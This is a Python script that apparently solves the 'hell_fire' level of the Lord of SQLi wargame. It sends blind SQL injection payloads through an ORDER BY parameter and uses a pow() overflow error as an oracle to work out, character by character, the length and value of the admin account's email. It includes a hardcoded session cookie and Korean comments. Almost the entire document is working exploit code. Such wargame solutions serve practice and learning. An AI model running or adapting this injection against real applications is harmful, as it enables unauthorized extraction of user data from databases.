import requests
import string

url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
params={'order' : None}
cookies = {'PHPSESSID' :'1t87momi7f10m7tl6kkv6t0lob' }

# 이메일 길이
for i in range(30):
    payload="(select 1 where if(id='admin' and length(email)={},pow(12341234,12341234),1))".format(i)
    params['order'] = payload
    print(payload)
    response = requests.get(url,params=params,cookies=cookies)
    if("rubiya805@gmail.cm" not in response.text):
        print("find the pw_length",i)
        break

# 이메일 길이 28

email = ''
for i in range(1,29):
    for j in string.printable:
        payload="(select 1 where if(id='admin' and ascii(substr(email,{},1))={},pow(12341234,12341234),1))".format(i,ord(j))
        params['order'] = payload
        print(payload)
        response = requests.get(url,params=params,cookies=cookies)
        if("rubiya805@gmail.cm" not in response.text):
            email += j
            print("find the email",email)
            break

print(email)